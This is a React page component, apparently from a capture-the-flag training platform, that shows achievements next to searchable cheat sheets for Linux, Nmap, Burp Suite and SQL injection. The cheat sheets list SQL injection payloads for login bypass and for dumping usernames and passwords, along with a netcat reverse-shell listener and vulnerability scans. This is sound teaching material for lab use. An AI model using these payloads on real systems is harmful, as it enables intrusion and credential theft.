import { useState, useEffect } from 'react';
import API from '../api/axios';
import AchievementCard from '../components/AchievementCard';
import ProgressBar from '../components/ProgressBar';

const CHEATSHEETS = [
  {
    id: 'linux',
    title: 'Linux Commands',
    icon: '🐧',
    description: 'Essential commands for file system, permissions, processes, and network analysis.',
    sections: [
      {
        title: '📂 File System & Navigation',
        commands: [
          { cmd: 'ls -la', desc: 'List directory contents in long format, showing hidden files' },
          { cmd: 'pwd', desc: 'Print working directory path' },
          { cmd: 'cd /path/to/dir', desc: 'Change working directory' },
          { cmd: 'cat file.txt', desc: 'Display content of a file' },
          { cmd: 'less file.txt', desc: 'Open file in interactive scrollable viewer' },
          { cmd: 'tail -n 20 file.log', desc: 'Show last 20 lines of a file (useful for logs)' },
          { cmd: 'grep "pattern" file.txt', desc: 'Search for a regex pattern in a file' },
          { cmd: 'find / -name "flag.txt" 2>/dev/null', desc: 'Find flag file from root directory, hiding permission errors' }
        ]
      },
      {
        title: '🔒 Permissions & Ownership',
        commands: [
          { cmd: 'chmod +x script.sh', desc: 'Make script executable' },
          { cmd: 'chmod 600 id_rsa', desc: 'Set read-write permissions for owner only (required for SSH keys)' },
          { cmd: 'chown root:root file.txt', desc: 'Change owner and group of a file to root' },
          { cmd: 'sudo -l', desc: 'List permitted privileges for the current user' }
        ]
      },
      {
        title: '🌐 Networking & Services',
        commands: [
          { cmd: 'ip a', desc: 'Show all network interfaces and IP addresses' },
          { cmd: 'netstat -tulnp', desc: 'List all active TCP/UDP listening ports and processes' },
          { cmd: 'ss -antp', desc: 'Alternative to netstat: display TCP socket statistics' },
          { cmd: 'curl http://10.10.10.10 -o index.html', desc: 'Download a web page/file' },
          { cmd: 'nc -lvnp 4444', desc: 'Start netcat listener on port 4444 for incoming reverse shells' }
        ]
      }
    ]
  },
  {
    id: 'nmap',
    title: 'Nmap Port Scanner',
    icon: '📡',
    description: 'Network discovery and vulnerability scanning commands.',
    sections: [
      {
        title: '🔍 Scan Types & Optimization',
        commands: [
          { cmd: 'nmap 10.10.10.10', desc: 'Scan the most common 1000 TCP ports' },
          { cmd: 'nmap -sS 10.10.10.10', desc: 'Stealth / SYN scan (requires root privileges)' },
          { cmd: 'nmap -sU 10.10.10.10', desc: 'Scan UDP ports' },
          { cmd: 'nmap -p- 10.10.10.10', desc: 'Scan all 65,535 TCP ports' },
          { cmd: 'nmap -T4 10.10.10.10', desc: 'Set timing template (T0 to T5, T4 is fast and optimized)' }
        ]
      },
      {
        title: '🛡️ Service & OS Enumeration',
        commands: [
          { cmd: 'nmap -sV 10.10.10.10', desc: 'Scan ports and probe open ports to determine service version info' },
          { cmd: 'nmap -O 10.10.10.10', desc: 'Enable OS detection' },
          { cmd: 'nmap -A 10.10.10.10', desc: 'Aggressive scan (Enables OS detection, version scanning, script scanning, and traceroute)' }
        ]
      },
      {
        title: '📜 Nmap Scripting Engine (NSE)',
        commands: [
          { cmd: 'nmap --script vuln 10.10.10.10', desc: 'Run all scripts categorised under the "vuln" category' },
          { cmd: 'nmap --script http-enum 10.10.10.10', desc: 'Enumerate common directories on the web server' },
          { cmd: 'nmap -p 21 --script ftp-anon 10.10.10.10', desc: 'Check if FTP server allows anonymous login' }
        ]
      }
    ]
  },
  {
    id: 'burp',
    title: 'Burp Suite Cheatsheet',
    icon: '🕸️',
    description: 'Quick reference guide for Burp Suite tools, navigation, and proxy configurations.',
    sections: [
      {
        title: '⚙️ Core Setup',
        commands: [
          { cmd: 'Proxy > Intercept > Intercept is ON', desc: 'Capture browser request before sending it to the server' },
          { cmd: 'Target > Scope > Add to Scope', desc: 'Set target scope to filter out external traffic and analytics sites' }
        ]
      },
      {
        title: '⌨️ Shortcut Keys',
        commands: [
          { cmd: 'Ctrl + R', desc: 'Send intercepted request to Repeater' },
          { cmd: 'Ctrl + I', desc: 'Send intercepted request to Intruder' },
          { cmd: 'Ctrl + U', desc: 'URL-decode selected text' },
          { cmd: 'Ctrl + Shift + U', desc: 'URL-encode selected text' },
          { cmd: 'Ctrl + B', desc: 'Base64-decode selected text' }
        ]
      },
      {
        title: '🛠️ Utility Modules',
        commands: [
          { cmd: 'Repeater', desc: 'Modify headers or payload parameters and replay requests manually to inspect server responses' },
          { cmd: 'Intruder', desc: 'Automate customized attacks (e.g. brute force, fuzzing, parameter scanning) using payload positions' },
          { cmd: 'Decoder', desc: 'Convert raw data to base64, hex, URL formatting, or hash values' }
        ]
      }
    ]
  },
  {
    id: 'sqli',
    title: 'SQLi Cheatsheet',
    icon: '💉',
    description: 'SQL Injection payloads for authentication bypass, column enumeration, and database dumping.',
    sections: [
      {
        title: '🔐 Auth Bypass',
        commands: [
          { cmd: "' OR 1=1 --", desc: 'Classic auth bypass payload (closes string and comments out remainder)' },
          { cmd: "' OR '1'='1", desc: 'Bypass auth when query is wrapped without comments' },
          { cmd: "admin' --", desc: 'Log in directly as admin user (if username is admin)' }
        ]
      },
      {
        title: '📊 UNION-Based Queries',
        commands: [
          { cmd: "' ORDER BY 1 --", desc: 'Determine column count (increment index until error is thrown)' },
          { cmd: "' UNION SELECT 1,2,3 --", desc: 'Perform UNION SELECT once column count is known to identify vulnerable reflection columns' },
          { cmd: "' UNION SELECT null, version(), database() --", desc: 'Extract system database version and active database name' }
        ]
      },
      {
        title: '📁 Database Dumping (MySQL)',
        commands: [
          { cmd: "' UNION SELECT null, group_concat(schema_name), null FROM information_schema.schemata --", desc: 'List all databases' },
          { cmd: "' UNION SELECT null, group_concat(table_name), null FROM information_schema.tables WHERE table_schema='target_db' --", desc: 'List all tables inside database target_db' },
          { cmd: "' UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_name='users' --", desc: 'List all columns in users table' },
          { cmd: "' UNION SELECT null, group_concat(username, ':', password), null FROM users --", desc: 'Dump all usernames and passwords from users table' }
        ]
      }
    ]
  }
];

export default function Achievements() {
  const [achievements, setAchievements] = useState([]);
  const [stats, setStats] = useState({ total: 0, unlocked: 0, locked: 0 });
  const [filter, setFilter] = useState('all'); // all, unlocked, locked
  const [loading, setLoading] = useState(true);
  
  // Tab control: 'trophies' or 'cheatsheets'
  const [activeTab, setActiveTab] = useState('trophies');
  
  // Cheatsheet state
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedSheet, setSelectedSheet] = useState(null);
  const [copySuccess, setCopySuccess] = useState('');

  useEffect(() => {
    fetchAchievements();
  }, []);

  const fetchAchievements = async () => {
    try {
      const { data } = await API.get('/achievements');
      setAchievements(data.achievements);
      setStats(data.stats);
    } catch (error) {
      console.error('Fetch achievements error:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(text);
    setTimeout(() => setCopySuccess(''), 2000);
  };

  const filteredAchievements = achievements.filter((a) => {
    if (filter === 'unlocked') return a.unlocked;
    if (filter === 'locked') return !a.unlocked;
    return true;
  });

  const filteredSheets = CHEATSHEETS.filter((sheet) => {
    if (!searchQuery) return true;
    const query = searchQuery.toLowerCase();
    const matchesTitle = sheet.title.toLowerCase().includes(query);
    const matchesDesc = sheet.description.toLowerCase().includes(query);
    const matchesCommand = sheet.sections.some(sec => 
      sec.commands.some(cmd => 
        cmd.cmd.toLowerCase().includes(query) || cmd.desc.toLowerCase().includes(query)
      )
    );
    return matchesTitle || matchesDesc || matchesCommand;
  });

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-[60vh]">
        <p className="font-['VT323'] text-2xl animate-blink text-white">LOADING STORE...</p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="border-b-2 border-white pb-4 flex flex-col md:flex-row md:items-end justify-between gap-4">
        <div>
          <h1 className="text-4xl md:text-5xl font-bold text-white uppercase">🏬 Store & Library</h1>
          <p className="text-gray-400 mt-2 font-mono uppercase text-sm">Milestones & Reference Arsenal</p>
        </div>

        {/* Sub-Tab Selector */}
        <div className="flex gap-2">
          <button
            onClick={() => setActiveTab('trophies')}
            className={`px-4 py-2 font-bold uppercase transition-all border text-sm font-mono rounded-md ${
              activeTab === 'trophies'
                ? 'bg-[var(--color-cyber-primary)] text-white border-[var(--color-cyber-primary)] shadow-[0_0_10px_var(--color-cyber-primary)]'
                : 'bg-black/40 text-gray-400 border-white/20 hover:text-white hover:border-white/50'
            }`}
          >
            🏆 Achievements
          </button>
          <button
            onClick={() => setActiveTab('cheatsheets')}
            className={`px-4 py-2 font-bold uppercase transition-all border text-sm font-mono rounded-md ${
              activeTab === 'cheatsheets'
                ? 'bg-[var(--color-cyber-primary)] text-white border-[var(--color-cyber-primary)] shadow-[0_0_10px_var(--color-cyber-primary)]'
                : 'bg-black/40 text-gray-400 border-white/20 hover:text-white hover:border-white/50'
            }`}
          >
            📚 Cheat Sheets
          </button>
        </div>
      </div>

      {activeTab === 'trophies' ? (
        <div className="space-y-6 animate-fade-in">
          {/* Stats */}
          <div className="grid grid-cols-3 gap-4">
            <div className="retro-card text-center">
              <p className="text-5xl font-bold text-white font-['VT323']">{stats.total}</p>
              <p className="text-xs text-gray-500 mt-2 font-mono uppercase font-bold">Total</p>
            </div>
            <div className="retro-card text-center border-white">
              <p className="text-5xl font-bold text-white font-['VT323']">{stats.unlocked}</p>
              <p className="text-xs text-white mt-2 font-mono uppercase font-bold">Unlocked</p>
            </div>
            <div className="retro-card text-center border-gray-600">
              <p className="text-5xl font-bold text-gray-500 font-['VT323']">{stats.locked}</p>
              <p className="text-xs text-gray-500 mt-2 font-mono uppercase font-bold">Locked</p>
            </div>
          </div>

          {/* Progress */}
          <div className="retro-card">
            <div className="flex items-center justify-between mb-4 border-b-2 border-dotted border-gray-600 pb-2">
              <span className="text-2xl text-white">Progress</span>
              <span className="text-4xl font-bold text-white font-['VT323']">
                {stats.total > 0 ? Math.round((stats.unlocked / stats.total) * 100) : 0}%
              </span>
            </div>
            <ProgressBar
              percentage={stats.total > 0 ? (stats.unlocked / stats.total) * 100 : 0}
              showLabel={false}
              height="24px"
            />
          </div>

          {/* Filter */}
          <div className="flex gap-4 border-t-2 border-dotted border-gray-600 pt-4">
            {[
              { key: 'all', label: 'ALL' },
              { key: 'unlocked', label: '✅ UNLOCKED' },
              { key: 'locked', label: '🔒 LOCKED' },
            ].map((f) => (
              <button
                key={f.key}
                onClick={() => setFilter(f.key)}
                className={`px-3 py-1.5 font-bold uppercase transition-all border text-xs font-mono rounded-md ${
                  filter === f.key
                    ? 'bg-[var(--color-cyber-primary)] text-white border-[var(--color-cyber-primary)] shadow-[0_0_10px_var(--color-cyber-primary)]'
                    : 'bg-black/40 text-gray-400 border-white/20 hover:text-white hover:border-white/50'
                }`}
              >
                {f.label}
              </button>
            ))}
          </div>

          {/* Achievement Grid */}
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
            {filteredAchievements.map((achievement, index) => (
              <AchievementCard key={achievement.id || achievement._id} achievement={achievement} delay={index * 50} />
            ))}
          </div>

          {filteredAchievements.length === 0 && (
            <div className="retro-card text-center py-12">
              <span className="text-6xl mb-4 block grayscale">🎯</span>
              <p className="text-white font-bold text-2xl font-['VT323'] uppercase">
                {filter === 'unlocked' ? 'No trophies unlocked yet' : 'No locked trophies'}
              </p>
              <p className="text-gray-500 mt-2 font-mono uppercase text-sm">Keep playing to unlock more</p>
            </div>
          )}
        </div>
      ) : (
        <div className="space-y-6 animate-fade-in">
          {/* Search Cheatsheets */}
          <div className="retro-card">
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="SEARCH COMMANDS OR CHEAT SHEETS..."
              className="retro-input"
            />
          </div>

          {/* Cheatsheets Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {filteredSheets.map((sheet) => (
              <div key={sheet.id} className="retro-card flex flex-col justify-between gap-4">
                <div className="space-y-2">
                  <div className="flex items-center gap-3">
                    <span className="text-4xl">{sheet.icon}</span>
                    <h3 className="text-2xl font-bold text-white uppercase">{sheet.title}</h3>
                  </div>
                  <p className="text-gray-400 text-sm">{sheet.description}</p>
                </div>
                <button
                  onClick={() => setSelectedSheet(sheet)}
                  className="retro-btn text-xs py-2 w-full uppercase"
                >
                  Open Reference
                </button>
              </div>
            ))}
          </div>

          {filteredSheets.length === 0 && (
            <div className="retro-card text-center py-12">
              <span className="text-6xl mb-4 block grayscale">📚</span>
              <p className="text-white font-bold text-2xl font-['VT323'] uppercase">No results found</p>
              <p className="text-gray-500 mt-2 font-mono uppercase text-sm">Try using different search terms</p>
            </div>
          )}
        </div>
      )}

      {/* Cheatsheet Modal */}
      {selectedSheet && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div className="retro-card w-full max-w-4xl max-h-[85vh] overflow-y-auto flex flex-col relative border-2 border-white animate-scale-in">
            {/* Close Button */}
            <button
              onClick={() => setSelectedSheet(null)}
              className="absolute top-4 right-4 text-gray-400 hover:text-white font-bold text-xl uppercase font-mono bg-black/40 border border-white/20 hover:border-white/50 px-2.5 py-1 rounded"
            >
              CLOSE [X]
            </button>

            {/* Modal Header */}
            <div className="flex items-center gap-3 border-b-2 border-white pb-4 mb-6">
              <span className="text-5xl">{selectedSheet.icon}</span>
              <div>
                <h2 className="text-3xl font-bold text-white uppercase">{selectedSheet.title}</h2>
                <p className="text-xs text-gray-400 font-mono uppercase mt-1">Reference Library / Arsenal</p>
              </div>
            </div>

            {/* Modal Sections */}
            <div className="space-y-6 flex-1 pr-2">
              {selectedSheet.sections.map((section) => (
                <div key={section.title} className="space-y-3">
                  <h4 className="text-lg font-bold text-white border-b border-dotted border-gray-600 pb-1 uppercase">{section.title}</h4>
                  <div className="space-y-3">
                    {section.commands.map((c) => (
                      <div key={c.cmd} className="flex flex-col md:flex-row md:items-center justify-between gap-3 p-3 bg-black/40 border border-white/10 hover:border-white/20 rounded-md transition-all">
                        <div className="font-mono text-sm min-w-0 flex-1">
                          <span className="text-[var(--color-cyber-primary)] font-bold mr-2">&gt;</span>
                          <span className="text-white bg-black/60 px-2 py-1.5 rounded border border-white/5 font-semibold inline-block break-all">{c.cmd}</span>
                          <p className="text-gray-400 text-xs mt-2 uppercase">{c.desc}</p>
                        </div>
                        <button
                          onClick={() => handleCopy(c.cmd)}
                          className={`px-3 py-1.5 font-bold uppercase transition-all text-xs font-mono rounded shrink-0 border ${
                            copySuccess === c.cmd
                              ? 'bg-green-500/20 text-green-500 border-green-500 shadow-[0_0_10px_rgba(34,197,94,0.3)]'
                              : 'bg-black text-gray-400 border-white/20 hover:text-white hover:border-white/50'
                          }`}
                        >
                          {copySuccess === c.cmd ? 'COPIED!' : 'COPY'}
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
